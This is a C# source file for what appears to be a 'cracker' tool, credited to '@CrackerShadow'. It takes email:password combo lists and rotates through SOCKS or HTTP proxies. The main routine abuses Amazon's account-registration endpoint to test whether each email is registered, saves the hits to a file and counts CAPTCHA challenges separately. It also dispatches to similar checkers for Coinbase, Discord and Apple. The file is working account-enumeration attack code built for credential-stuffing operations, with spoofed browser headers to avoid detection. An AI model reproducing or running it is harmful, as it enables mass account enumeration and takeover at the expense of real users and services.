using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Web;
using System.Drawing;
using VM.VM;

namespace VM
{
    internal class Checker
    {
        public static int total;
        public static int api;
        public static int bad = 0;
        public static int hits = 0;
        public static int Custom = 0;
        public static int Flagged = 0;
        public static int err = 0;
        public static int retries = 0;
        public static int check = 0;
        public static List<string> ProxyList = new List<string>();
        public static string proxytype = "";
        public static int proxytotal = 0;
        public static int stop = 0;
        public static ConcurrentQueue<string> ComboQueue = new ConcurrentQueue<string>();
        public static List<string> Flag = new List<string>();
        public static int CPM = 0;
        public static int CPM_aux = 0;
        public static int threads;
        public static Random rnd = new Random();
        public static string show = "";
        public static string ib = "";
        public static int timeout = 0;

        private static void Amazon(string combo)
        {
            try
            {
                HttpRequest httpRequest = new HttpRequest()
                {
                    IgnoreProtocolErrors = true,
                    KeepAlive = true,
                    ConnectTimeout = Checker.timeout
                };
                string[] strArray1 = combo.Split(':', ';', '|');
                string[] strArray2 = Checker.ProxyList.ElementAt<string>(new Random().Next(0, Checker.proxytotal)).Split(':', ';', '|');
                ProxyClient proxyClient = Checker.proxytype == "SOCKS5" ? (ProxyClient)new Socks5ProxyClient(strArray2[0], int.Parse(strArray2[1])) : (Checker.proxytype == "SOCKS4" ? (ProxyClient)new Socks4ProxyClient(strArray2[0], int.Parse(strArray2[1])) : (ProxyClient)new HttpProxyClient(strArray2[0], int.Parse(strArray2[1])));
                if (strArray2.Length == 4)
                {
                    proxyClient.Username = strArray2[2];
                    proxyClient.Password = strArray2[3];
                }
                httpRequest.Proxy = proxyClient;
                string str1 = Checker.RandomDigits(12);
                httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback)((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
                httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36");
                httpRequest.AddHeader("Pragma", "no - cache");
                httpRequest.AddHeader("Accept", "*/*");
                httpRequest.AllowAutoRedirect = true;
                string str2 = httpRequest.Get("https://na.account.amazon.com/ap/register?showRememberMe=true&openid.pape.max_auth_age=0&enableGlobalAccountCreation=1&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&marketPlaceId=ATVPDKIKX0DER&signedMetricIdentifier=YB%2BUpNu5Nm%2BHZGrzkkqlqc19qxGKktAVpCc5K7tphAg%3D&language=en_US&pageId=iba&openid.return_to=https%3A%2F%2Fna.account.amazon.com%2Fap%2Foa%3FmarketPlaceId%3DATVPDKIKX0DER%26arb%3D5804516b-ea6c-48ea-86d4-4f040d73603e%26language%3Den_US&prevRID=YS0CK7NWMHE4C8MJ81W4&metricIdentifier=amzn1.application.8830f73e9e144f71904f36b10e9a042f&openid.assoc_handle=amzn_lwa_na&openid.mode=checkid_setup&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&oauth2params=eyJwIjoiMldoS3BGbzFKd0NOTFZWUnRlU3dmVmgzWGtUY0ptNnlNajNtdno5TWVPdndpUGxpWFJ5cC9TVXNWa0VXUC9xdkFnemdHaHYxTFA2TEtPdkxrZkJYNU1SbjFuUGxlVk5XUnQrYlBYTm42QjZhOHJlR0Y2MC9yaXhMazRyZmFjZnNIbm4rcDErb2NucWV2NHp4UmJTUnRuSzNDUXU5dFpOemNMTXhzK2NhQ0ttV1ViQjRYdkJFNWI5Vm03cGlGNGxZVVovWFc2WkV0M0EvT2xZYUVkdzZTdWFNTmI0dnpnSGNmdURZT0NHSWd6OFJrNlQrMXM0MkY5bkhpd3lvSEJ3UUJxeHJ0U1FzOG1vUnVrVmxQZi9nYlJzWTJJM296WjB0SmdoNmxrb2JlYVhDTGNQZ3NTK28vbk54dkorb25BMEE1MzBXMml6UmYzMDhjNDZyRHlxeUJWdWYrVnh1Vmg2dGxqWTNYQ01nOG9vUTN6OXN2Yk9UMStCZEIxeU9aWVUyMGJxQVB5STI1Z2ZJa2YwME1iSDRBbncvNTRHQmhMTjdHRUo5d0xESkh4QVp4ZCtrS3lNUnRQTUMrSWNuNVlmOHd0NTJpbStNUHJkanZOeDF4b2k4WXdYSkFEOThwR0p1YytTVHVOckJsQzZLdm8wSEJ6S2hUZisxempFUE9udzl6NEt2NkptRFBnTkViS3dERFpDN3NmMjNYdFp6M2xzYlBvaG9XQ3dtOHZwNG9wbGwvY3NpRTNOK21YUVcxMGNTWEZkVG85bTZsM2tET1BqL0t4NHVBcTBvbFFZdmhmaE9Bc2xVbSt5bVl0T0tWV3pFMUpWN2RjeWdZM1JIWk5ZT3Z0ekpkc0YyMllBcVNTQ0ZWNkRSOVd4OFJXaEZFTHM3VTFVQzBHdWx5RTY2ZVlRZlFsOHhLcjI5ajdoNmthcVZZWVZDQmhIME0wb1hOTHRrend5dmR5cW9NZUZSZnJHQVVGU3IrQnBwRXdrUWNwV2tZTHNnN1lxU3czWUkyOFdZb2RCV0ZNZ3YrcGh3Rmt5NkErYkZEaTVDYkY5MklYSE5ZRWVDbE5GSlZjQWY5ZWJyaTJuQ2ZuTnNJaytob1pTamVsSVNFa0p3UGlGRmxRdUdyRDhNb1V6MmJlcjVpampuYVZKSDJkcEMrZEZHc2tuQXcxM0J0VzNwZ1BScERCR096Nk5hS3JnZjBBSVBBYzNBOEZQb0JOcHlFL1pQeDVvOTRmUXlHMy9KOVgzVlZyNjBMSXJNN08rQ1ZwWEg2UzZ3ZHR6dDJlSVF3NE5HR2xCNm5oc2tuTUtlQ2loZmorY0ZrSTdlQVhGRmtJUXBUTk8xcnVRemplWkZKOXpFY3hiQ2tydVZINkFjRllmOWJhY3NiSm14MnduQlpuTXVGS24zRTd3c2JLVXZvUS9Wa0QyV2dYRytXVWt2KytpL2JKMGVTSWk5SzR3MzkvdmczMVk3UXFlemNrUk9xWFozTGF5RHphT3g2YjB2aStkSHNiUUR3dVVXQXg5OWtlZW1iOHR5NkVrVTZWSXduQkdrQjFHQitTV3VvdUtoRFg0RGd3UFpZMEFJVEVHaEMwR29qSVlqbmJBTHgxZXlWSFE3dkJEMHR3akFsVERkOTN4a2xkL0QyRjRXZHlsTnc5bnU2cy83QitraXArRkxlRW5oMUhxbExIeDdzcTEvR00rNi9jRFNOZVZ3UTd5ekNjSjZqekZFNmNkaW1xWkd5V3dSaDdncE16MHRCeGx0TTNYMjllckV3QW43K0xjVy9zb3RMdmFmNjl6cDhOZXZOb1l2K1ZTdmNTNTJEbFgxQ3BqQnB1RFZzZXE5S1lSYU9obHhULythbU4wZURrT3lFM0VFS1UyQ29vQWZweHZyejR2TUh6cTFzYUxPM3JGWXZWKytIS3FxaUQ5S1pCbVNPVXFWUk9Ed2hNMnVTbGxNZXRsTzFhNW5ZK3lTSjR6Vk9rWmUyOVNHL0tRSmVQaDIydmpXMkhORUNlNlRQaGswYkNWQzVRTnAyVnUwNUZ0T3IzOTNLRHZWakl6b2FVbjliaXpRQ1BHalcxcjVVUG1HQUNZQlhOcVlFNjNJdkw3d1dhOVVDd0RjQUF5RXhpNmNPZjcycmh1bmh3b3RWMDFWdjZBKzBBbmJ4VmNjNThiVXdGWDYyNkNxb3lDQlBLVmFKaGRLT2RlMmdmQ1VER0RNR2NFVEVVU21meG1RdnFrRnRESHg3dnJtR2t5LzF5ajcyM3JKakZrZGhvUU1VRDQ1YStvanUyckF5SXRNcEtiTkxya3RNdVdPclk5c05nMWVMdkVUb25JTnBBbE4wTmlyWDI2QmNMRTNyekpNRzVWbk9hU1p6cC9iZzNmSS84QjJLOEpnN2s2N3JXYW44K3ZXdGJsczhWVFhvdC91czg5bEJnbFRzQ2JzZEJ2WEpTaWtucjBVbjNWWHV4Nm04Q1IxUXFPYmRaU0c3Mm9CS05MazBSTzhoREJKRVZhcCtHWk4wKzNLcTE2NzIrZ2hBYk9aNzNrdXRuZ2Y4U0xMSS82RXFlOUMvYlU1VWt5RkcvTlJFZzAwbDdQUStSa3dNaHgrQzlucFN4NUJ0MEFOYzNheXRHdjFYRWNUZHhZU0RVSnBCZjRSMW9SOFdzK0VBTCsrWlNseVI5d2dBSncxUndyOWI0c0ZZY3N1bWgzTUVpVm9BbEFKc3hPUDA0SnVMb215bmxudU95MVRDZXZ1d2N0elJOdUVhQmYwWWJ1WXRGSWZnNHV5VEpHSlZXOU9kZ3dTdy9FS2tnNkhXTUZ6b1RVRkJLU2Y3bDE4MVhHSWwyUEJqUCt3R3Q2Q0cxRkwrNGk0L1hSclpzMnJ0UmVYSUJXS29nMDZnMnVNWXd6dmJLQ1I4SzcwSko5V2VTQWNzMnVwVG9GUGFhalQ1Q1pLcmNUZzNxZysvcHJOZG5YMmV2bEdCVVhGWUIySTVGZzc1L2RsSWxnWi9HdkkrZzA2MGV0TjNzaXR4VmtqMEdaOTV4RFNLWFEraHVEdDcyRnY2dU5uKytWNStTM2ZlQVUvU1NqQlpHSGZQNmEzT2tEU0VQcHFNcEVDemVXb2huMFBwY3NHY2NGazZ0UDNFdnpCSVpuSmlNSjVXMEVsNU9WcXhVVHV6RVBSTkdCaGw1WklkRlBSNlE5WGNGcldzcjg1NFp5WVRQMkhnbU9ZUUQrcXFSQjlSYlhXcmxiU3g0N1JybHhKOTh6SlRUOXNYRlN4Qkh1UXVMMEoybUxHRWlHcnZZUVMrSjR5S2NwaWp1Z1UwSGFHM3VMK1lJWjc2bk0rNlRCVVRXYkx5VGNJbTJVS20wbGtpakwvNHZyZER6SHo2dDk3NGdoaE03ZjM4UFNFbENrOW9HOTFTcndYNDN6Q1ZETUVlQUI5Q0hjOUdHRk9EOEJ3KzRONTc1cEkvazkzam1rNkRuN0ttL01ZaytVWmFtdGZMTTE0NmYzWWZCYlhFTTlabFhZS3Y1ZHBDS2NlbWl1bW94ZDdqei9ERi96SXdlUEpreU9wa3pEKzBmMS9TY1RGeFF2d0N0WVZJQTNRakZndGVteW85ZWZUV1hhZjBQTGNBUEZISmI4MktSeklmOWdpazJnbkRSTy9kbjl3bUprQnpITzZYeHJvRW93RERQaEM2Q3FkaFl4Mks4TTBwQ1BIOUpKaDg5cVp6S3k1Zks3N3k1dEdyVjk5Sm9WUnVacDVIYzJRZGx1bWZOTENBQ0t5MFpuRFdkMDdHcStKeVVXUk1wK3R0bWtJR01MdjU4amVobDVTVjJ3eWhxeVBTNXMvKzVFUWd4M1ZtNEx2TDNTODVjc0pDRGRxRkljbEFlS2MrRWVCNXltRCtKNmt3WTlpYnA2aUxKTWlFa2trU2NlbXZFeWRtTzFaS1lZL3Ftd0ExNm9WNCtmVzh6WGQyUDc0TE5XK1lUY3BreHNBY3dTdUZ4UXMxaDlPWGVBdXBLV1BLUU0yaXpPRUhReEtab29CRkZHd2JvWU5OL29ncGZ3UmRvemxKWC9xVE1JYjdwbmJXTjZHVUc2aktSNEtHaHM5VnZKV0FsYnhlOVJ1VjVVaGdNb0NxZkZ5STBSS2J1ck9zejJjRjBSTHhham1kU1J4TDh6dXRtSnJaM3hRZWR1MW5EZisrbUo5TDl0YkJPLzJsNGJ2VGlEWk9vcm14dTVVVHZuaDhDc3BjWExUNlJyV2toMU84Q09BUllwS01hNFduZVg4M3haL0JXeUxvTS93ZitBejY3dFRNNkpNTXZxWkxsaGhpV2JJclgvTEhEdFBjbm4zMXNXQUE0UUVWNTZtQXVNPSIsImkiOiJ3K2NjTjJoSzhyalh4cWQ4aHIwR2h3PT0iLCJzIjoiMHVCczBiYTVhQ3FzVWRMenlZU3JRZU1wd0c5QjVoTTBjZDZubFNibWxsST0iLCJldiI6MSwiaHYiOjF9").ToString();
                string ORT = betweenStrings(str2, "name=\"openid.return_to\" value=\"", "\" /><input type=\"hidden\" name=\"prevRID");
                string PRID = betweenStrings(str2, "name=\"siteState\" value=\"", "\" /><input type=\"hidden\" name=\"workflowState");
                string WFS = betweenStrings(str2, "name=\"workflowState\" value=\"", "\" /> <div id=\"ap_register_signin_form_table_wrapper");
                string AAT = betweenStrings(str2, "name=\"appActionToken\" value=\"", "\" />< input type = \"hidden\" name = \"appAction\" value = \"REGISTER");
                httpRequest.ClearAllHeaders();
                httpRequest.AllowAutoRedirect = true;
                httpRequest.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
                httpRequest.AddHeader("Accept-Encoding", "gzip, deflate, br");
                httpRequest.AddHeader("Accept-Language", "en-US,en;q=0.9");
                httpRequest.AddHeader("Cache-Control", "max-age=0");
                httpRequest.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                httpRequest.AddHeader("Host", "na.account.amazon.com");
                httpRequest.AddHeader("Origin", "https://na.account.amazon.com");
                httpRequest.AddHeader("Referer", "https://na.account.amazon.com/");
                httpRequest.AddHeader("sec-ch-ua", "\"Google Chrome\"; v = \"89\", \"Chromium\"; v = \"89\", \";Not A Brand\"; v = \"99\"");
                httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36");
                httpRequest.AddHeader("Sec-Fetch-Site", "same-origin");
                httpRequest.AddHeader("Sec-Fetch-Dest", "document");
                string str3 = httpRequest.Post("https://na.account.amazon.com/ap/register", "appActionToken="+AAT+ "&appAction=REGISTER&openid.return_to="+ORT+ "&prevRID="+PRID+ "&workflowState="+WFS+ "&customerName=Json+Bear&email="+strArray1[0]+ "&emailCheck="+strArray1[0]+ "&password=UTN1Mg6L&passwordCheck=UTN1Mg6L&continue=Create+account&metadata1=", "application/x-www-form-urlencoded").ToString();
                if (str3.Contains("but an account already exists with the email address"))
                {
                    Interlocked.Increment(ref Checker.hits);
                    Interlocked.Increment(ref Checker.check);
                    Export.WriteToFileThreadSafe(combo, "..\\VM\\AMAZON_VM.txt");
                    if (Checker.show == "Y")
                        Colorful.Console.WriteLine("[ - ]" + combo, Color.LawnGreen);
                }
                if (str3.Contains("Solve this puzzle to protect your account"))
                {
                    Interlocked.Increment(ref Checker.check);
                    Interlocked.Increment(ref Checker.bad);
                    if (Checker.show == "Y")
                        Colorful.Console.WriteLine("[ - ]" + combo, Color.Red);
                }
            }
            catch 
            {
                Interlocked.Increment(ref Checker.err);
                Checker.ComboQueue.Enqueue(combo);
            }
        }


        public static void StartWorker(int threads)
        {
            ThreadPool.SetMinThreads(threads, threads);
            Thread[] threadArray = new Thread[threads];
            for (int index = 0; index < threads; ++index)
            {
                threadArray[index] = new Thread((ThreadStart)(() =>
                {
                    while (!Checker.ComboQueue.IsEmpty)
                    {
                        string result;
                        Checker.ComboQueue.TryDequeue(out result);
                        if (api == 1)
                        {
                            Checker.Amazon(result);
                        }
                        if (api == 2)
                        {
                            CoinBase.CB(result);
                        }
                        if(api == 3)
                        {
                            Discord_VM.disord(result);
                        }
                        if (api == 4)
                        {
                            Apple_VM.apple(result);
                        }
                    }
                }));
                threadArray[index].Start();
            }
            for (int index = 0; index < threads; ++index)
                threadArray[index].Join();
            Thread.Sleep(-1);
        }

        public static void StartTitle()
        {
            Task.Factory.StartNew((Action)(() =>
            {
                while (true)
                {
                    int check = Checker.check;
                    Thread.Sleep(3000);
                    Checker.CPM = (Checker.check - check) * 20;
                }
            }));
            Task.Factory.StartNew((Action)(() =>
            {
                while (true)
                {
                    Colorful.Console.Title = string.Format("Yahoo Checker Coded By @CrackerShadow Checked: {0}/{1} | Hits: {2} | 2FA : {3} | Flagged : {4} | Bad: {5} | Retries : {6} | Errors: {7} | CPM: ", (object)Checker.check, (object)Checker.total, (object)Checker.hits, (object)Checker.Custom, (object)Checker.Flagged, (object)Checker.bad, (object)Checker.retries, (object)Checker.err) + Checker.CPM.ToString() + " ] ";
                    Thread.Sleep(1000);
                }
            }));
        }

        public static string RandomDigits(int length)
        {
            Random random = new Random();
            string empty = string.Empty;
            for (int index = 0; index < length; ++index)
                empty += random.Next(10).ToString();
            return empty;
        }
        public static int falgger(string c1)
        {
            int count = Flag.Where(x => x.Equals(c1)).Count();
            return count;
        }
        public static String betweenStrings(String text, String start, String end)
        {
            int p1 = text.IndexOf(start) + start.Length;
            int p2 = text.IndexOf(end, p1);
            if (end == "") return (text.Substring(p1));
            else return text.Substring(p1, p2 - p1);
        }
    }
}
